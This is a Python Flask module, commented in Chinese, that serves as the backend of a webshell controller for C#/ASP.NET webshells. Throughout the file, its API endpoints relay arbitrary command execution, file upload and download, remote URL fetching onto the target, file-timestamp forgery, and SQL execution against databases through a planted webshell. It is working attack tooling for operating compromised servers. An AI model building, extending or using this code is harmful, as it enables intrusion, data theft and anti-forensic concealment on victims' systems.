from flask import Blueprint, request, jsonify
import traceback
import os
import time
import tempfile
import base64
import datetime
import re

from .shell_factory import get_or_create_webshell_instance_by_id
from . import config as global_config


# 创建CSharp专属功能蓝图
csharp_shell_bp = Blueprint('csharp_shell', __name__, url_prefix='/api/webshell/csharp')


@csharp_shell_bp.route('/executeCommand', methods=['POST'])
def execute_command():
    """执行webshell命令"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        command = data.get('command')

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not command:
            return jsonify({'status': 'error', 'message': '命令不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        result = shell.execute_command(command)

        if result is not None:
            return jsonify({
                'status': 'success',
                'message': '命令执行成功',
                'data': {
                    'command': command,
                    'output': result
                }
            })

        return jsonify({'status': 'error', 'message': '命令执行失败'}), 500

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器内部错误: {str(e)}'}), 500


# ====== 文件操作接口 ======

@csharp_shell_bp.route('/getFiles', methods=['POST'])
def get_files():
    """获取指定目录的文件列表"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        path = data.get('path')

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        files_result = shell.get_files(path)
        if files_result is None:
            return jsonify({'status': 'error', 'message': '获取文件列表失败'}), 500

        if isinstance(files_result, list):
            file_list = files_result
        else:
            file_list = parse_file_list_text(str(files_result))

        return jsonify({
            'status': 'success',
            'data': {
                'path': path,
                'files': file_list
            }
        })

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


def parse_file_list_text(files_text):
    """解析get_files返回的文件列表文本"""
    try:
        lines = files_text.strip().split('\n')
        file_list = []

        if len(lines) <= 1:
            return file_list

        for line in lines[1:]:
            line = line.strip()
            if not line:
                continue

            try:
                parts = re.split(r'\s+', line, maxsplit=5)
                if len(parts) < 5:
                    continue

                file_name = parts[0]
                file_type = parts[1]
                date = parts[2]
                file_time = parts[3]
                size = parts[4]
                permission = parts[5] if len(parts) > 5 else 'Unknown'

                file_info = {
                    'name': file_name,
                    'isDirectory': file_type == '0',
                    'lastModified': f"{date} {file_time}",
                    'size': int(size) if size.isdigit() else 0,
                    'permission': permission
                }
                file_list.append(file_info)
            except Exception as parse_error:
                print(f"[WARNING] 解析文件行失败: {line}, 错误: {parse_error}")
                continue

        return file_list

    except Exception as e:
        print(f"[ERROR] 解析文件列表失败: {e}")
        return []


@csharp_shell_bp.route('/uploadFile', methods=['POST'])
def upload_file():
    """上传文件（支持普通上传和大文件上传）"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        file_path = data.get('filePath')
        file_data = data.get('fileData')
        use_big_upload = data.get('useBigUpload', False)
        chunk_position = data.get('chunkPosition', 0)
        total_file_size = data.get('totalFileSize', 0)
        chunk_mb_size = data.get('chunkMbSize', global_config.UPLOAD_CHUNK_MB_SIZE)
        delay_seconds = data.get('delaySeconds', global_config.UPLOAD_DELAY_SECONDS)
        max_retries = data.get('maxRetries', global_config.UPLOAD_MAX_RETRIES)

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_path:
            return jsonify({'status': 'error', 'message': '文件路径不能为空'}), 400
        if file_data is None:
            return jsonify({'status': 'error', 'message': '文件数据不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        if isinstance(file_data, list):
            file_data = bytes(file_data)
        elif isinstance(file_data, str):
            file_data = file_data.encode('utf-8', errors='ignore')

        if use_big_upload:
            chunk_size = len(file_data)
            chunk_mb_size_bytes = chunk_mb_size * 1024 * 1024
            total_chunks = (total_file_size + chunk_mb_size_bytes - 1) // chunk_mb_size_bytes
            current_chunk_index = chunk_position // chunk_mb_size_bytes + 1

            success = False
            for retry in range(max_retries):
                try:
                    result = shell.big_file_upload(file_path, file_data, str(chunk_position))
                    if result:
                        success = True
                        break
                    print(f"[WARNING] 块 {current_chunk_index} 上传失败，重试 {retry + 1}/{max_retries}")
                except Exception as chunk_error:
                    print(f"[ERROR] 块 {current_chunk_index} 上传异常: {chunk_error}")

                if retry < max_retries - 1:
                    time.sleep(delay_seconds)

            if not success:
                progress = 0
                if total_file_size:
                    progress = (chunk_position + chunk_size) / total_file_size * 100
                return jsonify({
                    'status': 'error',
                    'message': f'大文件上传失败：块 {current_chunk_index} 上传失败，已重试 {max_retries} 次',
                    'data': {
                        'failedChunk': current_chunk_index,
                        'totalChunks': total_chunks,
                        'chunkPosition': chunk_position,
                        'progress': progress
                    }
                }), 500

            progress = 0
            if total_file_size:
                progress = (chunk_position + chunk_size) / total_file_size * 100

            return jsonify({
                'status': 'success',
                'message': f'块 {current_chunk_index} 上传成功',
                'data': {
                    'filePath': file_path,
                    'uploadMode': 'big',
                    'currentChunk': current_chunk_index,
                    'totalChunks': total_chunks,
                    'chunkPosition': chunk_position,
                    'chunkSize': chunk_size,
                    'totalFileSize': total_file_size,
                    'progress': progress
                }
            })

        result = shell.upload_file(file_path, file_data)
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件上传成功',
                'data': {
                    'filePath': file_path,
                    'uploadMode': 'normal'
                }
            })

        return jsonify({'status': 'error', 'message': '文件上传失败'}), 500

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


@csharp_shell_bp.route('/downloadFile', methods=['POST'])
def download_file():
    """下载文件（支持普通下载和大文件下载）"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        file_name = data.get('fileName')
        use_big_download = data.get('useBigDownload', False)
        chunk_kb_size = data.get('chunkKbSize')
        timeout_seconds = data.get('timeoutSeconds', global_config.DOWNLOAD_TIMEOUT_SECONDS)
        enable_chunk_size_variation = data.get('enableChunkSizeVariation', False)
        chunk_size_variation_kb = data.get('chunkSizeVariationKb', global_config.DOWNLOAD_CHUNK_VARIATION_KB)

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_name:
            return jsonify({'status': 'error', 'message': '文件名不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        if use_big_download:
            temp_dir = tempfile.gettempdir()
            temp_filename = f"webshell_download_{int(time.time())}_{os.path.basename(file_name)}"
            temp_filepath = os.path.join(temp_dir, temp_filename)

            try:
                download_success = shell.big_file_download(
                    file_path=file_name,
                    save_path=temp_filepath,
                    chunk_kb_size=chunk_kb_size,
                    timeout=timeout_seconds,
                    enable_chunk_size_variation=enable_chunk_size_variation,
                    chunk_size_variation_kb=chunk_size_variation_kb,
                )

                if download_success:
                    with open(temp_filepath, 'rb') as f:
                        result = f.read()
                    if os.path.exists(temp_filepath):
                        os.remove(temp_filepath)
                else:
                    result = '大文件下载失败'
            except Exception as big_error:
                print(f"[ERROR] 大文件下载异常: {big_error}")
                result = f'大文件下载异常: {str(big_error)}'
                if os.path.exists(temp_filepath):
                    os.remove(temp_filepath)
        else:
            result = shell.download_file(file_name)

        if result is None:
            return jsonify({'status': 'error', 'message': '文件下载失败：返回内容为空'}), 500

        if isinstance(result, str):
            result_lower = result.lower()
            if 'file does not exist' in result_lower or 'no such file' in result_lower:
                return jsonify({'status': 'error', 'message': f'文件不存在: {file_name}'}), 404
            if 'permission denied' in result_lower:
                return jsonify({'status': 'error', 'message': f'权限不足: {file_name}'}), 403
            if result.strip() == '文件内容为空' or len(result.strip()) == 0:
                return jsonify({'status': 'error', 'message': f'文件为空: {file_name}'}), 400

            return jsonify({
                'status': 'success',
                'message': '文件下载成功',
                'data': {
                    'fileName': file_name,
                    'content': result,
                    'contentType': 'text',
                    'downloadMode': 'big' if use_big_download else 'normal'
                }
            })

        if isinstance(result, bytes):
            encoded_content = base64.b64encode(result).decode('utf-8')
            return jsonify({
                'status': 'success',
                'message': '文件下载成功',
                'data': {
                    'fileName': file_name,
                    'content': encoded_content,
                    'contentType': 'binary',
                    'downloadMode': 'big' if use_big_download else 'normal'
                }
            })

        return jsonify({'status': 'error', 'message': f'未知的文件内容类型: {type(result)}'}), 500

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


@csharp_shell_bp.route('/deleteFile', methods=['POST'])
def delete_file():
    """删除文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        file_name = data.get('fileName')

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_name:
            return jsonify({'status': 'error', 'message': '文件名不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        result = shell.delete_file(file_name)
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件删除成功',
                'data': {
                    'fileName': file_name,
                    'result': 'success'
                }
            })

        return jsonify({'status': 'error', 'message': '文件删除失败'}), 500

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


@csharp_shell_bp.route('/newFile', methods=['POST'])
def new_file():
    """新建文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        file_name = data.get('fileName')

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_name:
            return jsonify({'status': 'error', 'message': '文件名不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        result = shell.new_file(file_name)
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件创建成功',
                'data': {
                    'fileName': file_name,
                    'result': 'success'
                }
            })

        return jsonify({'status': 'error', 'message': '文件创建失败'}), 500

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


@csharp_shell_bp.route('/newDir', methods=['POST'])
def new_dir():
    """新建目录"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        dir_name = data.get('dirName')

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not dir_name:
            return jsonify({'status': 'error', 'message': '目录名不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        result = shell.new_dir(dir_name)
        if result:
            return jsonify({
                'status': 'success',
                'message': '目录创建成功',
                'data': {
                    'dirName': dir_name,
                    'result': 'success'
                }
            })

        return jsonify({'status': 'error', 'message': '目录创建失败'}), 500

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


@csharp_shell_bp.route('/copyFile', methods=['POST'])
def copy_file():
    """复制文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        src_file_name = data.get('srcFileName')
        dest_file_name = data.get('destFileName')

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not src_file_name:
            return jsonify({'status': 'error', 'message': '源文件名不能为空'}), 400
        if not dest_file_name:
            return jsonify({'status': 'error', 'message': '目标文件名不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        result = shell.copy_file(src_file_name, dest_file_name)
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件复制成功',
                'data': {
                    'srcFileName': src_file_name,
                    'destFileName': dest_file_name,
                    'result': 'success'
                }
            })

        return jsonify({'status': 'error', 'message': '文件复制失败'}), 500

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


@csharp_shell_bp.route('/moveFile', methods=['POST'])
def move_file():
    """移动文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        src_file_name = data.get('srcFileName')
        dest_file_name = data.get('destFileName')

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not src_file_name:
            return jsonify({'status': 'error', 'message': '源文件名不能为空'}), 400
        if not dest_file_name:
            return jsonify({'status': 'error', 'message': '目标文件名不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        result = shell.move_file(src_file_name, dest_file_name)
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件移动成功',
                'data': {
                    'srcFileName': src_file_name,
                    'destFileName': dest_file_name,
                    'result': 'success'
                }
            })

        return jsonify({'status': 'error', 'message': '文件移动失败'}), 500

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


@csharp_shell_bp.route('/zip', methods=['POST'])
def zip_files():
    """压缩文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        compress_paths = data.get('compressPaths')
        compress_file = data.get('compressFile')

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not compress_paths:
            return jsonify({'status': 'error', 'message': '压缩路径不能为空'}), 400
        if not compress_file:
            return jsonify({'status': 'error', 'message': '压缩文件路径不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        result = shell.zip(compress_paths, compress_file)
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件压缩成功',
                'data': {
                    'compressPaths': compress_paths,
                    'compressFile': compress_file,
                }
            })

        return jsonify({'status': 'error', 'message': '文件压缩失败'}), 500

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


@csharp_shell_bp.route('/unzip', methods=['POST'])
def unzip_files():
    """解压文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        compress_file = data.get('compressFile')
        extract_dir = data.get('extractDir')

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not compress_file:
            return jsonify({'status': 'error', 'message': '压缩文件路径不能为空'}), 400
        if not extract_dir:
            return jsonify({'status': 'error', 'message': '解压目录路径不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        result = shell.unzip(compress_file, extract_dir)
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件解压成功',
                'data': {
                    'compressFile': compress_file,
                    'extractDir': extract_dir,
                }
            })

        return jsonify({'status': 'error', 'message': '文件解压失败'}), 500

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


@csharp_shell_bp.route('/fileRemoteDownload', methods=['POST'])
def file_remote_download():
    """远程下载文件"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        download_url = data.get('downloadUrl')
        save_path = data.get('savePath')

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not download_url:
            return jsonify({'status': 'error', 'message': '下载URL不能为空'}), 400
        if not save_path:
            return jsonify({'status': 'error', 'message': '保存路径不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        result = shell.file_remote_download(download_url, save_path)
        if result:
            return jsonify({
                'status': 'success',
                'message': '远程文件下载成功',
                'data': {
                    'downloadUrl': download_url,
                    'savePath': save_path
                }
            })

        return jsonify({'status': 'error', 'message': '远程文件下载失败'}), 500

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


@csharp_shell_bp.route('/setFileAttr', methods=['POST'])
def set_file_attr():
    """设置文件属性（权限或时间）"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        webshell_id = data.get('webshell_id')
        file_path = data.get('filePath')
        attr_type = data.get('attrType')

        if not webshell_id:
            return jsonify({'status': 'error', 'message': 'Webshell ID不能为空'}), 400
        if not file_path:
            return jsonify({'status': 'error', 'message': '文件路径不能为空'}), 400
        if attr_type not in ['permission', 'time']:
            return jsonify({'status': 'error', 'message': '属性类型必须是permission或time'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'Webshell实例创建失败'}), 500

        if attr_type == 'permission':
            permission = data.get('permission')
            if not permission:
                return jsonify({'status': 'error', 'message': '权限属性不能为空'}), 400
            if not re.match(r'^[RWXrwx]+$', permission):
                return jsonify({'status': 'error', 'message': '权限格式无效，只允许RWX字母组合'}), 400

            permission = permission.upper()
            result = shell.set_file_permission(file_path, permission)
            if result:
                return jsonify({
                    'status': 'success',
                    'message': '文件权限设置成功',
                    'data': {
                        'filePath': file_path,
                        'permission': permission,
                        'attrType': 'permission'
                    }
                })

            return jsonify({'status': 'error', 'message': '文件权限设置失败'}), 500

        modify_time = data.get('modifyTime')
        access_time = data.get('accessTime')
        create_time = data.get('createTime')

        if not modify_time and not access_time and not create_time:
            return jsonify({'status': 'error', 'message': '至少需要提供一个时间参数'}), 400

        time_list = []
        for time_value, field_name in [
            (modify_time, '修改时间'),
            (access_time, '访问时间'),
            (create_time, '创建时间'),
        ]:
            if time_value and str(time_value).strip():
                try:
                    datetime.datetime.strptime(time_value, "%Y-%m-%d %H:%M:%S")
                    time_list.append(time_value)
                except ValueError:
                    return jsonify({'status': 'error', 'message': f'{field_name}格式无效，请使用：YYYY-MM-DD HH:MM:SS'}), 400
            else:
                time_list.append('none')

        result = shell.set_file_time(file_path, time_list)
        if result:
            return jsonify({
                'status': 'success',
                'message': '文件时间设置成功',
                'data': {
                    'filePath': file_path,
                    'modifyTime': modify_time if modify_time and str(modify_time).strip() else None,
                    'accessTime': access_time if access_time and str(access_time).strip() else None,
                    'createTime': create_time if create_time and str(create_time).strip() else None,
                    'attrType': 'time'
                }
            })

        return jsonify({'status': 'error', 'message': '文件时间设置失败'}), 500

    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


# ====== 数据库管理接口 ======

@csharp_shell_bp.route('/testDatabaseConnection', methods=['POST'])
def test_database_connection():
    """测试数据库连接"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        required_params = ['webshell_id', 'dbType', 'host', 'port', 'username', 'dbPassword']
        for param in required_params:
            if param not in data:
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400

        webshell_id = data['webshell_id']
        db_type = data['dbType']
        db_host = data['host']
        db_port = data['port']
        db_username = data['username']
        db_password = data['dbPassword']

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500

        success, result_message = shell.test_database_connection(
            db_type=db_type,
            db_host=db_host,
            db_port=db_port,
            db_username=db_username,
            db_password=db_password,
        )

        if success:
            return jsonify({
                'status': 'success',
                'message': '数据库连接测试成功',
                'data': {
                    'dbType': db_type,
                    'host': db_host,
                    'port': db_port,
                    'username': db_username,
                    'connectionDetails': result_message
                }
            })

        return jsonify({'status': 'error', 'message': f'数据库连接测试失败: {result_message}'}), 400

    except Exception as e:
        print(f"[ERROR] 测试数据库连接失败: {e}")
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


@csharp_shell_bp.route('/executeSql', methods=['POST'])
def execute_sql():
    """执行SQL语句"""
    try:
        data = request.json
        if not data:
            return jsonify({'status': 'error', 'message': '请求参数不能为空'}), 400

        required_params = ['webshell_id', 'dbType', 'host', 'port', 'username', 'dbPassword', 'sql']
        for param in required_params:
            if param not in data:
                return jsonify({'status': 'error', 'message': f'缺少必需参数: {param}'}), 400

        webshell_id = data['webshell_id']
        db_type = data['dbType']
        db_host = data['host']
        db_port = data['port']
        db_username = data['username']
        db_password = data['dbPassword']
        sql_query = data['sql']

        if not sql_query or not sql_query.strip():
            return jsonify({'status': 'error', 'message': 'SQL语句不能为空'}), 400

        shell = get_or_create_webshell_instance_by_id(webshell_id)
        if not shell:
            return jsonify({'status': 'error', 'message': 'webshell连接失败'}), 500

        if not hasattr(shell, 'exec_sql'):
            return jsonify({'status': 'error', 'message': '当前webshell类型不支持数据库功能'}), 400

        sql_lower = sql_query.strip().lower()
        is_select_query = (
            sql_lower.startswith('select')
            or sql_lower.startswith('show')
            or sql_lower.startswith('desc')
            or sql_lower.startswith('explain')
        )
        exec_type = 'select' if is_select_query else 'update'

        success, result = shell.exec_sql(
            db_type=db_type,
            db_host=db_host,
            db_port=db_port,
            db_username=db_username,
            db_password=db_password,
            exec_type=exec_type,
            exec_sql=sql_query,
        )

        if success:
            if exec_type == 'select':
                parsed_data = parse_database_query_result(result)
                return jsonify({
                    'status': 'success',
                    'message': 'SQL查询执行成功',
                    'data': parsed_data,
                    'queryType': 'select'
                })

            return jsonify({
                'status': 'success',
                'message': 'SQL执行成功',
                'data': result,
                'queryType': 'update'
            })

        return jsonify({'status': 'error', 'message': f'SQL执行失败: {result}'}), 400

    except Exception as e:
        print(f"[ERROR] 执行SQL失败: {e}")
        print(traceback.format_exc())
        return jsonify({'status': 'error', 'message': f'服务器错误: {str(e)}'}), 500


def parse_database_query_result(result_data):
    """解析数据库查询结果"""
    try:
        if not result_data or not result_data.strip():
            return []

        lines = result_data.strip().split('\n')
        if len(lines) < 2:
            return []

        header_line = lines[0]
        column_names = []

        raw_columns = header_line.split('\t')
        for col in raw_columns:
            if col.strip():
                try:
                    decoded_col = base64.b64decode(col.strip()).decode('utf-8')
                    column_names.append(decoded_col)
                except Exception:
                    column_names.append(col.strip())

        if not column_names:
            return []

        result_rows = []
        for line_index in range(1, len(lines)):
            line = lines[line_index].strip()
            if not line:
                continue

            raw_values = line.split('\t')
            row_data = {}
            for i, raw_value in enumerate(raw_values):
                if i < len(column_names):
                    column_name = column_names[i]
                    if raw_value.strip():
                        try:
                            decoded_value = base64.b64decode(raw_value.strip()).decode('utf-8')
                            row_data[column_name] = decoded_value
                        except Exception:
                            row_data[column_name] = raw_value.strip()
                    else:
                        row_data[column_name] = ''

            result_rows.append(row_data)

        return result_rows

    except Exception as e:
        print(f"[ERROR] 解析数据库查询结果失败: {e}")
        raise e
